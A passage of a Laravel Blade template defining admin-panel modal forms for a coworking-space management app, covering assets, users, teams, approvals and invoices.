                    </div>
                    <div id="reassign_task_id" style="display: none;"></div>
                    <div class="form-group row">
                        <button type="button" id="admin_reasign_task_modal_post"
                                class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple">ReAssign Task
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- /Add Admin reasign task modal -->


<!-- Add Admin user profile modal -->
<div id="admin_user_profile_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-sm">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">User Profile</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <div class="col-md-12">

                <!-- Zooming -->
                <div class="card">
                    <div class="card-img-actions">
                        <a href="{{asset('theme_assets/images/placeholders/placeholder.jpg')}}" data-popup="lightbox">
                            <img class="card-img-top img-fluid"
                                 src="{{asset('theme_assets/images/placeholders/placeholder.jpg')}}">
                            <span class="card-img-actions-overlay card-img-top">
										<i class="icon-plus3 icon-2x"></i>
									</span>
                        </a>
                    </div>

                    <div class="card-body">
                        <h5 class="card-title text-center">Demo User</h5>
                        <p class="card-text text-center">Nomad</p>
                        <p class="card-text text-center">Team Leader</p>
                    </div>

                    <div class="card-footer d-flex justify-content-between">
                        <span class="text-muted text-center">demo@demo.com</span>

                    </div>
                </div>
                <!-- /zooming -->

            </div>

        </div>
    </div>
</div>
<!-- /Add Admin reasign task modal -->

<!-- Add Admin direct chat modal -->
<div id="direct_user_modal" class="modal fade">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Direct message</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">

                    <div class="form-group row">
                        <div class="col-sm-10">
                            <div class="form-group">
                                <select data-placeholder="Enter user name" class="form-control select-minimum"
                                        data-fouc>
                                    <option></option>
                                    <option value="0">Ali</option>
                                    <option value="1">Imran</option>
                                    <option value="2">James</option>
                                    <option value="3">Martin</option>

                                </select>

                                {{--<select class="form-control select" data-placeholder="Find or start a conversation" data-fouc>--}}
                                {{--<optgroup label="Users">--}}
                                {{--<option></option>--}}
                                {{--<option value="0">Ali</option>--}}
                                {{--<option value="1">Imran</option>--}}
                                {{--<option value="2">James</option>--}}
                                {{--<option value="3">Martin</option>--}}
                                {{--</optgroup>--}}
                                {{--</select>--}}
                            </div>
                        </div>
                        <div class="col-sm-2">
                            <button type="submit" class="btn bg-primary">GO</button>
                        </div>
                    </div>

                </div>
            </form>
        </div>
    </div>
</div>
<!-- /Add Admin direct chat modal -->
{{--/***********************************Assets Modal******************************************************/--}}

<div id="admin_assets_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add an Asset</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Asset Name</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" placeholder="Asset name" id="admin-asset-name"
                                   required>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Asset Price</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" placeholder="Asset price" id="admin-asset-price"
                                   required>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Branch</label>
                        <div class="col-sm-8">
                            <select class="form-control select" data-fouc id="asset_branch" required>
                                <option>Select Branch</option>
                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Is Nomad</label>
                        <div class="col-sm-8">
                            <div class="row admin-asset-is-nomad">
                                <div class="col-sm-6">

                                    <span class="form-group col-form-label">Yes</span> <input type="radio" value="1"
                                                                                              class="ml-2 form-group"
                                                                                              name="nomad_asset"
                                                                                              required>
                                </div>
                                <div class="col-sm-6">

                                    <span class="form-group col-form-label">No</span> <input type="radio" value="0"
                                                                                             class="ml-2 form-group"
                                                                                             name="nomad_asset"
                                                                                             required>
                                </div>
                            </div>

                        </div>
                    </div>


                    <div class="form-group row" id="asset_bookable">
                        <label class="col-form-label col-sm-4">Bookable</label>
                        <div class="col-sm-8">
                            <select class="form-control " id="admin-asset-status" required>
                                <option>Select Option</option>
                                <option value="0">No</option>
                                <option value="1">Yes</option>
                            </select>
                        </div>
                    </div>

                    <div class="form-group row" id="asset_deposit_label">
                        <div class="col-sm-8" id="nomad_deposit_text">
                            <input type="number" class="form-control" placeholder="Fixed Deposit" id="asset_deposit"
                                   required>
                        </div>
                    </div>

                    <div class="form-group row" id="booking_label">
                        <div class="col-sm-8" id="booking_text">

                        </div>
                    </div>

                    <div class="form-group row" id="printing_label">
                        <div class="col-sm-8" id="printing_text">
                        </div>
                    </div>

                    <div class="form-group row" id="booking_color">
                        <div class="col-sm-8" id="printing_text">
                            <select class="form-control select" data-fouc id="select_color" required>
                                <option>Select Color</option>
                                <option value="#3490dc">Blue</option>
                                <option value="#6574cd">Indigo</option>
                                <option value="#9561e2">Purple</option>
                                <option value="#f66D9b">Pink</option>
                                <option value="#e3342f">Red</option>
                                <option value="#f6993f">Orange</option>
                                <option value="#38c172">Green</option>
                                <option value="#6cb2eb">Cyan</option>
                            </select>
                        </div>
                    </div>


                    <h3 class="bg-danger text-center mt-2 p-1 card-body" style="width: auto;"
                        id="asset_error_msg"></h3>

                    <div class="form-group row">
                        <button type="button"
                                class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple add-submit-asset">
                            Add
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>

        </div>
    </div>
</div>


<div id="admin_nomad_asset_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add an Asset For Nomad</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Asset Name</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" placeholder="Asset name" id="admin-nomad-asset-name"
                                   required>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Asset Price</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" placeholder="Asset price"
                                   id="admin-nomad-asset-price" required>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Branch</label>
                        <div class="col-sm-8">
                            <select class="form-control select" data-fouc id="asset_nomad_branch" required>
                                <option>Select Branch</option>
                            </select>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Asset Fix Deposit</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" placeholder="Asset fix deposit"
                                   id="asset_nomad_deposit" required>
                        </div>
                    </div>

                    <div class="form-group row" id="booking_nomad_color">
                        <label class="col-form-label col-sm-4"> Asset Color</label>
                        <div class="col-sm-8" id="">
                            <select class="form-control select" data-fouc id="select_nomad_color" required>
                                <option>Select Color</option>
                                <option value="#3490dc">Blue</option>
                                <option value="#6574cd">Indigo</option>
                                <option value="#9561e2">Purple</option>
                                <option value="#f66D9b">Pink</option>
                                <option value="#e3342f">Red</option>
                                <option value="#f6993f">Orange</option>
                                <option value="#38c172">Green</option>
                                <option value="#6cb2eb">Cyan</option>
                            </select>
                        </div>
                    </div>
                    <h3 class="bg-danger text-center" id="nomad_asset_error_msg_container">Nomad Asset Of All Branches
                        Already Exists!</h3>

                    <div class="form-group row">
                        <button type="button"
                                class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple add-submit-nomad-asset"
                                id="add-submit-nomad-asset">Add
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>

        </div>
    </div>
</div>


{{--Asset edit modal--}}
<div id="admin_assets_modal_edit" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add a Asset</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Asset Name</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" placeholder="Asset name" id="admin-asset-name-edit"
                                   required>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Asset Price</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" placeholder="Asset price"
                                   id="admin-asset-price-edit" required>
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Branch</label>
                        <div class="col-sm-8">
                            <select class="form-control select" data-fouc id="asset_branch_edit" required>
                                <option>Select Branch</option>
                            </select>
                        </div>
                    </div>

                    <div class="form-group row" id="deposit_label">
                        <label class="col-form-label col-sm-4">Fixed Deposit</label>
                        <div class="col-sm-8" id="deposit_text">
                            <input type="number" class="form-control" placeholder="Fixed Deposit"
                                   id="asset_deposit_edit" required>
                        </div>
                    </div>
                    <div class="form-group row" id="booking_label">
                        <label class="col-form-label col-sm-4">Free Booking</label>
                        <div class="col-sm-8" id="booking_text">
                            <input type="number" class="form-control" placeholder="Free Booking Credit"
                                   id="asset_free_booking_edit" required>
                        </div>
                    </div>

                    <div class="form-group row" id="printing_label">
                        <label class="col-form-label col-sm-4">Free Printing</label>
                        <div class="col-sm-8" id="printing_text">
                            <input type="number" class="form-control" placeholder="Free Printing Credit"
                                   id="asset_free_printing_edit" required>
                        </div>
                    </div>

                    <div class="form-group row" id="booking_color">
                        <label class="col-form-label col-sm-4">Select Color For Booking</label>
                        <div class="col-sm-8" id="printing_text">
                            <select class="form-control select" data-fouc id="select_color_edit" required>
                                <option>Select Color</option>
                                <option value="#3490dc">Blue</option>
                                <option value="#6574cd">Indigo</option>
                                <option value="#9561e2">Purple</option>
                                <option value="#f66D9b">Pink</option>
                                <option value="#e3342f">Red</option>
                                <option value="#f6993f">Orange</option>
                                <option value="#38c172">Green</option>
                                <option value="#6cb2eb">Cyan</option>
                            </select>
                        </div>
                    </div>


                    <div class="form-group row">
                        <input type="hidden" id="asset_hidden_id">
                        <input type="hidden" id="admin-asset-status-edit">
                        <button type="button"
                                class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple update-submit-asset">
                            Update
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>

        </div>
    </div>
</div>

<!-- Add User modal admin side-->
<div id="add-user-modal-admin" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add a User</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Name</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="user-name">
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Contact Number</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="contact_number">
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Address</label>
                        <div class="col-sm-8">
                            <textarea type="text" class="form-control" id="address"></textarea>
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Email</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="email">
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">City</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="city">
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Branch</label>
                        <div class="col-sm-8">
                            <select class="form-control select" data-fouc id="user_branch" required>
                                <option>Select Branch</option>
                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Walk-in Customer</label>
                        <div class="col-sm-8">

                            <!-- Default inline 2-->
                            <div class="custom-control custom-radio custom-control-inline">
                                <input type="radio" class="custom-control-input" value="1" id="user-walking1"
                                       name="user-walking" class="user-walking">
                                <label class="custom-control-label" for="user-walking1">Yes</label>
                            </div>

                            <!-- Default inline 3-->
                            <div class="custom-control custom-radio custom-control-inline">
                                <input type="radio" class="custom-control-input" value="0" id="user-walking2"
                                       name="user-walking" class="user-walking">
                                <label class="custom-control-label" for="user-walking2">No</label>
                            </div>

                        </div>
                    </div>

                    <div class="form-group row" id="user-password-container">
                        <label class="col-form-label col-sm-4">Password</label>
                        <div class="col-sm-8">
                            <input type="password" class="form-control" id="user-password">
                        </div>
                    </div>

                    <div class="form-group row" id="user-retype-password-container">
                        <label class="col-form-label col-sm-4">Re-Type Password</label>
                        <div class="col-sm-8">
                            <input type="password" class="form-control" id="user-password-retype">
                        </div>
                    </div>

                    <div class="form-group row" id="user-password-container">
                        <label class="col-form-label col-sm-4">Enter CNIC</label>
                        <div class="col-sm-8">
                            <input type="text" id="cnic" class="form-control" placeholder="Enter CNIC" required>
                        </div>
                    </div>


                    <div class="form-group row" id="user-password-container">
                        <label class="col-form-label col-sm-4">Date of birth:</label>
                        <div class="col-sm-8">
                            <div class="col-md-12">
                                <div class="row">

                                    <div class="col-md-4">
                                        <div class="form-group">
                                            <select id="dob_day" data-placeholder="Day"
                                                    class="form-control form-control-select2" data-fouc>
                                                <option></option>
                                                <option value="...">...</option>
                                                <?php for ($x = 1; $x <= 31; $x++){ ?>
                                                <option><?=$x?></option>
                                                <?php } ?>
                                            </select>
                                        </div>
                                    </div>

                                    <div class="col-md-4">
                                        <div class="form-group">
                                            <select id="dob_month" data-placeholder="Month"
                                                    class="form-control form-control-select2" data-fouc>
                                                <option></option>
                                                <option value="1">January</option>
                                                <option value="2">February</option>
                                                <option value="3">March</option>
                                                <option value="4">April</option>
                                                <option value="5">May</option>
                                                <option value="6">June</option>
                                                <option value="7">July</option>
                                                <option value="8">August</option>
                                                <option value="9">September</option>
                                                <option value="10">October</option>
                                                <option value="11">November</option>
                                                <option value="12">December</option>
                                            </select>
                                        </div>
                                    </div>


                                    <div class="col-md-4">
                                        <div class="form-group">
                                            <select id="dob_year" data-placeholder="Year"
                                                    class="form-control form-control-select2" data-fouc>
                                                <option></option>
                                                <?php
                                                $DOB_YEAR_START =  1960;
                                                $current_year = date('Y'); for ($count = $current_year; $count >= $DOB_YEAR_START; $count--) { ?>
                                                <option><?=$count?></option>
                                                <?php } ?>
                                            </select>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>


                    <div class="form-group row" id="package-type-container">
                        <label class="col-form-label col-sm-4">Package Type</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select a User..." class="form-control select" data-fouc
                                    id="package-type">
                                <option></option>
                                <optgroup label="Users">
                                    <option value="1">Nomad</option>
                                    <option value="2">Resident</option>
                                </optgroup>
                            </select>
                        </div>
                    </div>

                    <h3 class="bg-danger text-center" id="user_error_msg_container"></h3>


                    <div class="form-group row">
                        <button type="submit" class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple btn-user-add-submit">
                            Add
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Add Admin Team members modal -->


<div id="admin_user_team_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Select Team Members</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <form action="#" class="form-horizontal">
                <div class="modal-body">

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Add Members To Team</label>
                        <div class="col-sm-8">
                            <select multiple="multiple" data-placeholder="Select a member..."
                                    class="form-control select" data-fouc id="admin-team-members">
                                <option></option>
                                <optgroup label="Users">

                                </optgroup>
                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <input type="hidden" id="param-team-id">
                        <button type="submit"
                                class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple update-submit-team-members">
                            Update
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>

        </div>
    </div>
</div>

<!-- Add Admin Team members modal -->


<div id="team_history_utilization" class="modal  fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Utilization </h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <table class="table table-bordered table-responsive">
                <thead>
                <tr>
                    <th>#</th>
                    <th>Site</th>
                    <th>Room</th>
                    <th>Time</th>
                    <th>Date</th>
                    <th>Usage</th>
                    <th>Rate</th>
                    <th>Total</th>
                    <th>Booked By</th>
                </tr>
                </thead>
                <tbody id="utilization">
                <tr>
                    <td></td>
                    <td></td>
                    <td></td>
                    <td></td>
                    <td></td>
                    <td></td>
                    <td></td>
                    <td></td>
                    <td></td>
                </tr>

                </tbody>
            </table>

        </div>
    </div>
</div>


<div id="admin_user_team" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Select Team</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <form action="#" class="form-horizontal">
                <div class="modal-body">

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Team</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select a team..." class="form-control select" data-fouc
                                    id="select-team-assign">
                                <optgroup label="Teams">
                                    <option>Select Team</option>

                                </optgroup>
                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <input type="hidden" id="param-team-id">
                        <button type="submit"
                                class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple update-auth-team-status">
                            Update
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>

        </div>
    </div>
</div>
{{--/***************************Team Assign and create modal***********************************/--}}

<div id="user_aproval_modal" class="modal fade" tabindex="-1">
    <div class="loading-bar"></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Approval Form</h5>

            </div>
            <form action="#" class="form-horizontal" id="approval_form">
                <div class="modal-body">

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select User Type</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select a type..." class="form-control select" data-fouc
                                    id="user_type_dropdown" required>
                                <optgroup label="Teams">
                                    <option value="0">Select Type</option>
                                    <option value="1">Lead</option>
                                    <option value="2">Member</option>

                                </optgroup>
                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label id="team_label" class="col-form-label col-sm-4"></label>
                        <div class="col-sm-8" id="textArea">

                        </div>
                    </div>

                    <div id="lead_menu_table" class="form-group row">
                        <div class="col-sm-8 col-md-8">
                            <table id="assets_table" name="assets_table" class="table table-bordered">
                                <thead>
                                <tr>
                                    <th>
                                        #
                                    </th>
                                    <th>
                                        Asset
                                    </th>
                                    <th>
                                        Quantity
                                    </th>

                                    <th>

                                    </th>

                                </tr>

                                </thead>
                                <tbody>
                                <tr>
                                    <td>
                                        1
                                    </td>
                                    <td width="40%">
                                        <select id="selectItems_0" class="form-control select"
                                                placeholder="Item"></select>
                                    </td>
                                    <td>
                                        <input type="number" min="1" id="item_quantity_0" class="form-control"
                                               placeholder="Quantity" required>
                                    </td>


                                    <td>

                                    </td>

                                </tr>
                                </tbody>
                            </table>
                        </div>
                        <div class="col-sm-12 col-md-12">
                            <button id="btn-asset-add-row" class="btn bg-teal d-flex align-items-center">
                                <i class="icon-plus-circle2 mr-1"></i> Add Item
                            </button>
                        </div>
                    </div>

                    <div class="form-group row" id="div_team_time_limit_from">
                        <label class="col-form-label col-sm-4">Team Time Limit From</label>
                        <div class="col-sm-8">
                            <input type="date" class="form-control  pickatime-intervals-team" id="team_time_limit_from"
                                   placeholder="Choose time from" required>
                        </div>
                    </div>
                    <div class="form-group row " id="div_team_time_limit_to">
                        <label class="col-form-label col-sm-4">Team Time Limit To</label>
                        <div class="col-sm-8">
                            <input type="date" class="form-control  pickatime-intervals-team" id="team_time_limit_to"
                                   placeholder="Choose time to" required>
                        </div>

                    </div>

                    <div class="form-group row" id="div_team_members_limit">
                        <label id="team_label" class="col-form-label col-sm-4">Team Members Limit</label>
                        <div class="col-sm-2" id="team_members">
                            <input type="number" id="members_limit" value="0" class="form-control" min="0">
                        </div>
                    </div>
                    <div class="form-group row" id="div_team_guests_limit">
                        <label id="team_label" class="col-form-label col-sm-4">Team Guests/Day Limit</label>
                        <div class="col-sm-2" id="team_members">
                            <input type="number" id="guests_limit" value="0" class="form-control" min="0">
                        </div>
                    </div>
                    <div class="form-group row" id="div_tax">
                        <label id="team_label" class="col-form-label col-sm-4">Invoice Tax %</label>
                        <div class="col-sm-2" id="invoice_text">
                            <input type="number" id="invoice_tax" value="0" class="form-control" min="0" max="20">
                        </div>
                    </div>
                    <div class="form-group row" id="div_discount">
                        <label id="team_label" class="col-form-label col-sm-4">Invoice Discount %</label>
                        <div class="col-sm-2" id="textArea">
                            @if(Auth::user()->type==1)
                                <input type="number" id="invoice_discount" value="0" class="form-control" min="0"
                                       max=100>
                            @else
                                <input type="number" id="invoice_discount" value="0" class="form-control" min="0"
                                       max=10>
                            @endif
                        </div>
                    </div>

                    {{--<div class="form-group row" id="recurring_option">--}}
                    {{--<label id="team_label" class="col-form-label col-sm-4">Make invoice recurring </label>--}}
                    {{--<div class="col-sm-2" >--}}
                    {{--<input type="checkbox" id="recurring_invoice_checkbox"  value="0" class="form-control">--}}
                    {{--</div>--}}
                    {{--</div>--}}

                    <div class="form-group row" id="recurring_cycles">
                        <label id="team_label" class="col-form-label col-sm-4">Recurring Invoice Months</label>
                        <div class="col-sm-2">
                            <input type="number" id="cycles" value="1" min="1" class="form-control">
                        </div>
                    </div>
                    <h3 class="bg-danger text-center" id="team_error_msg_container"></h3>


                    <div class="form-group row">
                        <input type="hidden" id="status_user_id">
                        <button type="submit"
                                class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple update_approval">
                            Update
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal" id="btn-cancel">Cancel</button>
                    </div>
                </div>
            </form>

        </div>
    </div>
</div>
{{--Invoice Generation--}}
<div id="invoice_generate_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Create a Invoice</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Wallet Type</label>
                        <div class="col-sm-8">
                            <div class="form-group">
                                <select class="form-control select" data-fouc id="wallet_type" required>
                                    <optgroup label="Wallets">
                                        <option value="1">Non Bookable Asset</option>
                                        <option value="2">Bookable Asset</option>
                                        <option value="3">Printing</option>
                                    </optgroup>
                                </select>
                            </div>
                        </div>
                    </div>

                    <div class="form-group row" id="discount-div">
                        <label class="col-form-label col-sm-4">Enter Discount</label>
                        <div class="col-sm-8">
                            <input type="number" value="0" placeholder="Discount %" class="form-control"
                                   id="invoice_discount" required>
                        </div>
                    </div>
                    <div class="form-group row" id="tax-div">
                        <label class="col-form-label col-sm-4">Enter Tax</label>
                        <div class="col-sm-8">
                            <input type="number" value="0" placeholder="Tax %" class="form-control" id="invoice_tax"
                                   required>
                        </div>
                    </div>
                    <div class="form-group row" id="date-from-div">
                        <label class="col-form-label col-sm-4">Date From</label>
                        <div class="col-sm-8">
                            <input type="date" class="form-control pickadate-year" id="invoice-date-from"
                                   placeholder="CHOOSE DATE FROM">
                        </div>
                    </div>
                    <div class="form-group row" id="date-to-div">
                        <label class="col-form-label col-sm-4">Date To</label>
                        <div class="col-sm-8">
                            <input type="date" class="form-control pickadate-year" id="invoice-date-to"
                                   placeholder="CHOOSE DATE TO">
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Description</label>
                        <div class="col-sm-8">
                            <input type="text" value="0" placeholder="Description" class="form-control"
                                   id="invoice_description" required>
                        </div>
                    </div>


                    <div class="form-group row">
                        <input type="hidden" id="invoice_team">
                        <button type="button" class="btn bg-primary" id="generate">Create</button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
{{--Invoice Generation end--}}

{{--Team Asset Assign modal--}}
<div id="assign_asset_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Assign Asset</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Asset</label>
                        <div class="col-sm-8">
                            <div class="form-group">
                                <select class="form-control select" data-fouc id="team_asset" required>
                                    <optgroup label="Assets">

                                    </optgroup>
                                </select>
                            </div>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Quantity</label>
                        <div class="col-sm-8">
                            <input type="number" min="0" value="1" placeholder="Quantity" class="form-control"
                                   id="asset_quantity" required>
                        </div>
                    </div>

                    <div class="form-group row">
                        <input type="hidden" id="asset_team">
                        <button type="button" class="btn bg-primary" id="assign_asset_submit">Create</button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                        <br><br>
                        <b><p>Note: Asset added from here will auto add to team Recurring invoice with existing tax/discount.
                       <br> Edit Recurring invoice to update tax/discount </p></b>

                    </div>
                </div>
            </form>
        </div>
    </div>
</div>

{{--Team Asset Assign modal end--}}
{{--Admin Add Modal--}}
<div id="add-admin-modal" class="modal fade" tabindex="-1" style="overflow-y:scroll;">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add Admin</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">

                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Name</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="admin-user-name" name="admin-user-name"
                                   required>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Email</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" name="admin-email" id="admin-email" required>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Password</label>
                        <div class="col-sm-8">
                            <input type="password" class="form-control" name="admin-password" id="admin-password"
                                   required>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Re-Type-Password</label>
                        <div class="col-sm-8">
                            <input type="password" class="form-control" name="admin-password-retype" id="admin-password-retype"
                                   required>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Branch</label>
                        <div class="col-sm-8">
                            <select class="form-control select" data-fouc id="admin_branch" required>
                                <option>Select Branch</option>
                            </select>
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Contact Number</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="admin_contact_number">
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Address</label>
                        <div class="col-sm-8">
                            <textarea type="text" class="form-control" id="admin_address"></textarea>
                        </div>
                    </div>
                    <div class="form-group row" id="user-password-container">
                        <label class="col-form-label col-sm-4">Enter CNIC</label>
                        <div class="col-sm-8">
                            <input type="text" id="admin_cnic" class="form-control" placeholder="Enter CNIC" required>
                        </div>
                    </div>


                    <div class="form-group row" id="user-password-container">
                        <label class="col-form-label col-sm-4">Date of birth:</label>
                        <div class="col-sm-8">
                            <div class="col-md-12">
                                <div class="row">

                                    <div class="col-md-4">
                                        <div class="form-group">
                                            <select id="admin_dob_day" data-placeholder="Day"
                                                    class="form-control form-control-select2" data-fouc>
                                                <option value=""></option>
                                                <option value="...">...</option>
                                                <?php for ($x = 1; $x <= 31; $x++){ ?>
                                                <option><?=$x?></option>
                                                <?php } ?>
                                            </select>
                                        </div>
                                    </div>

                                    <div class="col-md-4">
                                        <div class="form-group">
                                            <select id="admin_dob_month" data-placeholder="Month"
                                                    class="form-control form-control-select2" data-fouc>
                                                <option value=""></option>
                                                <option value="1">January</option>
                                                <option value="2">February</option>
                                                <option value="3">March</option>
                                                <option value="4">April</option>
                                                <option value="5">May</option>
                                                <option value="6">June</option>
                                                <option value="7">July</option>
                                                <option value="8">August</option>
                                                <option value="9">September</option>
                                                <option value="10">October</option>
                                                <option value="11">November</option>
                                                <option value="12">December</option>
                                            </select>
                                        </div>
                                    </div>


                                    <div class="col-md-4">
                                        <div class="form-group">
                                            <select id="admin_dob_year" data-placeholder="Year"
                                                    class="form-control form-control-select2" data-fouc>
                                                <option value=""></option>
                                                <?php
                                               $DOB_YEAR_START =  1960;
